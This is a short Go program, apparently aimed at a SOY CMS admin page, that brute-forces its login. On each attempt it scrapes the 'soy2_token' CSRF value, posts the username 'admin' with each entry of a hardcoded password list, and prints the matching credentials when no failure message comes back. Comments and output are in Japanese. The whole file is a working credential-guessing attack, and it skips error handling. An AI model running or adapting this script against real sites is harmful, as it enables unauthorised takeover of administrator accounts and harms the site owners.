package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
)

type Jar struct {
	lk      sync.Mutex
	cookies map[string][]*http.Cookie
}

func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make(map[string][]*http.Cookie)
	return jar
}

func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies[u.Host] = cookies
	jar.lk.Unlock()
}

func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies[u.Host]
}

func main() {
	var token string
	pws := []string{
		"password",
		"aaaaaaaa",
		"bbbbbbbb",
		"cccccccc",
		"hogehuga",
		"********",
		"nekoneko",
	}

	jar := NewJar()

	u := "http://example.com/cms/admin/"
	user := "admin"

	client := http.Client{
		Jar: jar,
	}

	for i := 0; i < len(pws); i++ {
		pw := pws[i]

		//ログインに成功したか？
		success := true

		resp, _ := client.Get(u)
		s := bufio.NewScanner(resp.Body)
		for s.Scan() {
			if hit := strings.Index(s.Text(), "soy2_token"); hit > 0 {
				re := regexp.MustCompile("value=\"(.*)\"")
				res := re.FindString(s.Text())
				res = strings.Replace(res, "value=", "", 1)
				token = strings.Trim(res, "\"")
			}
		}

		resp.Body.Close()
		params := url.Values{}
		params.Add("soy2_token", token)
		params.Add("Auth[name]", user)
		params.Add("Auth[password]", pw)

		resp, _ = client.PostForm(u, params)
		defer resp.Body.Close()
		s = bufio.NewScanner(resp.Body)
		for s.Scan() {

			if hit := strings.Index(s.Text(), "failed_message"); hit > 0 {
				fmt.Println("ログイン失敗")
				success = false
			}
		}

		//ログインが確認できたら、処理を終えて良い
		if success == true {
			fmt.Println("ログイン成功")
			fmt.Println("ヒットしたID:", user, "Pw:", pw)
			break
		}
	}
}
